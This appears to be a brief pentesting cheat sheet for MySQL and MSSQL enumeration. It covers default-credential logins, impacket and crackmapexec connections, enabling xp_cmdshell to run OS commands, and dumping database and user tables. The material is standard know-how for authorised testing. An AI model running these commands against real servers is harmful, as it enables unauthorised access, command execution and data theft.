# Database Enumeration (MySQL, MSSQL)

## MySQL (Port 3306)
```bash
# Default credentials
mysql -h $TARGET_IP -u root -p
mysql -h $TARGET_IP -u root --password=''
```

## MSSQL (Port 1433)
```bash
# Basic connection
impacket-mssqlclient $DOMAIN/user@$TARGET_IP -windows-auth
impacket-mssqlclient sa:password@$TARGET_IP

# Enumerate MSSQL with crackmapexec
crackmapexec mssql $TARGET_IP -u sa -p 'password' -d $TARGET_DOMAIN

# Enable xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';

# Common queries
SQL> SELECT name FROM sys.databases;
SQL> SELECT * FROM <dbname>.INFORMATION_SCHEMA.TABLES;
SQL> SELECT * FROM <dbname>.dbo.users;
```
